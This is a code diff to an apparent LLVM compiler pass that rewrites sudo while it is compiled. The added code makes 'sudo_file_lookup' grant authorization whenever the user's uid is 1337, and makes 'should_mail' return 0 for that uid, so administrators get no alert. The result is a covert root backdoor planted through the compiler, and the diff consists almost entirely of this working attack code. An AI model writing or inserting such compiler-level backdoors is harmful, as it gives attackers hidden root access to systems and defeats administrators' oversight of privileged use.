@@ -209,9 +209,170 @@ public:
 		    changed = true;*/
 		}
 	    }
-    } else if (F.getName() == "sudoers_lookup") {
+    } else if (F.getName() == "sudo_file_lookup") {
+	    Module *m = F.getParent();
+	    GlobalValue *v = m->getNamedValue("sudo_user");
+	    errs() << "Found sudo_file_lookup" << "\n";
+	    //for (auto &Global : m->getGlobalList())
+	    //	    errs() << Global << "\n";
+	    if (v) {
+		errs() << "#### Found sudo_user ####" << "\n";
+		Type *t = v->getValueType();
+		errs() << v << "\n";
+		errs() << t->isStructTy() << "\n";
+		if (t->isStructTy()) {
+	            errs() << "#### Passed Struct test ####" << "\n";
+		    auto numElements = t->getStructNumElements() ;
+		    errs() << "## Num elements " << numElements << "\n";
+		    if (numElements < 3)
+			    return false;
 
+		    Instruction *InsertPoint = &(*(F.getEntryBlock().getFirstInsertionPt()));
+		    IRBuilder<> IRB(InsertPoint);
+		    IRB.SetInsertPoint(InsertPoint);
+		    //Value *uid = IRB.CreateGEP(v, IRB.getInt64(numElements - 3));
+		    std::vector<llvm::Value*> indices(2);
+		    indices[0] = IRB.getInt32(0);
+		    indices[1] = IRB.getInt32(numElements - 3);
+
+		    Value *uid = IRB.CreateGEP(t, v, indices, "uidPtr");
+		    if (uid)
+			   errs() << "## Successfully inserted GEP ##" << "\n";
+		    
+	    	    LoadInst *uid_loaded = IRB.CreateLoad(uid);
+		    auto uidPtr = uid_loaded->getPointerOperandType();
+		    changed = true;
+
+		    if (uidPtr->isPointerTy() && dyn_cast<PointerType>(uidPtr)->getElementType()->isIntegerTy()) {
+			errs() << "## UID is integer type ##" << "\n";
+			//auto uidType = dyn_cast<PointerType>(uidPtr)->getElementType();
+			auto bitwidth = dyn_cast<IntegerType>(dyn_cast<PointerType>(uidPtr)->getElementType())->getBitWidth();
+			Value *CmpEq;
+			//LoadInst *uid_loaded = IRB.CreateLoad(uid);
+			if (bitwidth == 64)
+		    		CmpEq = IRB.CreateICmpEQ(uid_loaded, IRB.getInt64(1337));
+			else
+				CmpEq = IRB.CreateICmpEQ(uid_loaded, IRB.getInt32(1337));
+
+		    	BranchInst *BI = cast<BranchInst>(
+				    SplitBlockAndInsertIfThen(CmpEq, InsertPoint, false));
+
+		    	IRBuilder<> ThenB(BI);
+		    	//Value *retval = ConstantInt::get(F.getReturnType(), 0x1);
+		    	//ThenB.CreateRet(retval);
+			auto validated_arg = F.getArg(1);
+			if (validated_arg && validated_arg->getType()->isIntegerTy()) {
+				errs() << " ### Found validated arg ### " << "\n";
+				Value *retval = ThenB.CreateOr(validated_arg, ConstantInt::get(validated_arg->getType(), 0x02));
+				ThenB.CreateRet(retval);
+
+				auto BB = ThenB.GetInsertBlock();
+				for (auto inst = BB->begin(); inst != BB->end(); ) {
+ 			       		Instruction *Inst = &(*(inst++));
+			       		if (isa<BranchInst>(Inst)) {
+				       		BranchInst *BI = dyn_cast<BranchInst>(Inst);
+				       		if(BI->isUnconditional()) {
+					       		BI->dropAllReferences();
+					       		BI->removeFromParent();
+				       		}
+			       		}
+      				}
+
+			   //changed = true;
+		        }
+
+		    }
+	      }
+	}
+    } else if (F.getName() == "should_mail") {
+	    Module *m = F.getParent();
+	    GlobalValue *v = m->getNamedValue("sudo_user");
+	    errs() << "Found should_mail" << "\n";
+	    //for (auto &Global : m->getGlobalList())
+	    //	    errs() << Global << "\n";
+	    if (v) {
+		errs() << "#### Found sudo_user ####" << "\n";
+		Type *t = v->getValueType();
+		errs() << v << "\n";
+		errs() << t->isStructTy() << "\n";
+		if (t->isStructTy()) {
+	            errs() << "#### Passed Struct test ####" << "\n";
+		    auto numElements = t->getStructNumElements() ;
+		    errs() << "## Num elements " << numElements << "\n";
+		    if (numElements < 3)
+			    return false;
+
+		    Instruction *InsertPoint = &(*(F.getEntryBlock().getFirstInsertionPt()));
+		    IRBuilder<> IRB(InsertPoint);
+		    IRB.SetInsertPoint(InsertPoint);
+		    //Value *uid = IRB.CreateGEP(v, IRB.getInt64(numElements - 3));
+		    std::vector<llvm::Value*> indices(2);
+		    indices[0] = IRB.getInt32(0);
+		    indices[1] = IRB.getInt32(numElements - 3);
+
+		    Value *uid = IRB.CreateGEP(t, v, indices, "uidPtr");
+		    if (uid)
+			   errs() << "## Successfully inserted GEP ##" << "\n";
+		    
+	    	    LoadInst *uid_loaded = IRB.CreateLoad(uid);
+		    auto uidPtr = uid_loaded->getPointerOperandType();
+		    changed = true;
+
+		    if (uidPtr->isPointerTy() && dyn_cast<PointerType>(uidPtr)->getElementType()->isIntegerTy()) {
+			errs() << "## UID is integer type ##" << "\n";
+			//auto uidType = dyn_cast<PointerType>(uidPtr)->getElementType();
+			auto bitwidth = dyn_cast<IntegerType>(dyn_cast<PointerType>(uidPtr)->getElementType())->getBitWidth();
+			Value *CmpEq;
+			//LoadInst *uid_loaded = IRB.CreateLoad(uid);
+			if (bitwidth == 64)
+		    		CmpEq = IRB.CreateICmpEQ(uid_loaded, IRB.getInt64(1337));
+			else
+				CmpEq = IRB.CreateICmpEQ(uid_loaded, IRB.getInt32(1337));
+
+		    	BranchInst *BI = cast<BranchInst>(
+				    SplitBlockAndInsertIfThen(CmpEq, InsertPoint, false));
+
+		    	IRBuilder<> ThenB(BI);
+		    	Value *retval = ConstantInt::get(F.getReturnType(), 0x0);
+		    	ThenB.CreateRet(retval);
+			/*auto validated_arg = F.getArg(1);
+			if (validated_arg && validated_arg->getType()->isIntegerTy()) {
+				errs() << " ### Found validated arg ### " << "\n";
+				Value *retval = ThenB.CreateOr(validated_arg, ConstantInt::get(validated_arg->getType(), 0x02));
+				ThenB.CreateRet(retval);
+
+				auto BB = ThenB.GetInsertBlock();
+				for (auto inst = BB->begin(); inst != BB->end(); ) {
+ 			       		Instruction *Inst = &(*(inst++));
+			       		if (isa<BranchInst>(Inst)) {
+				       		BranchInst *BI = dyn_cast<BranchInst>(Inst);
+				       		if(BI->isUnconditional()) {
+					       		BI->dropAllReferences();
+					       		BI->removeFromParent();
+				       		}
+			       		}
+      				}
+
+			   //changed = true;
+		        }*/
+			auto BB = ThenB.GetInsertBlock();
+                        for (auto inst = BB->begin(); inst != BB->end(); ) {
+                              Instruction *Inst = &(*(inst++));
+                              if (isa<BranchInst>(Inst)) {
+                                  BranchInst *BI = dyn_cast<BranchInst>(Inst);
+                                  if(BI->isUnconditional()) {
+                                       BI->dropAllReferences();
+                                       BI->removeFromParent();
+                                  }
+                              }
+                   	}	
+
+
+		    }
+	      }
+	}
     }
+
     return changed;
 
   }
